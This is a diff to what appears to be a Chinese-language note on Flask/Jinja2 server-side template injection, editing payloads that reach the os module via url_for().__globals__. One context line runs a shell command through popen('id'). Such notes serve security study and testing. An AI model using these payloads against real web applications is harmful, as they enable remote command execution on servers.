@@ -33,11 +33,11 @@ url_for().__globals__['os'].popen('id').read()
 #### `__globals__`:对象方法模块的全局字典,包含os等主要模块
 
 ```
-().__class__.__init__.__globals__
+url_for().__class__.__init__.__globals__
 ```
 #### 掏出全局字典的os
 ```
-().__class__.__init__.__globals__['os']
+url_for().__class__.__init__.__globals__['os']
 ```
 
 
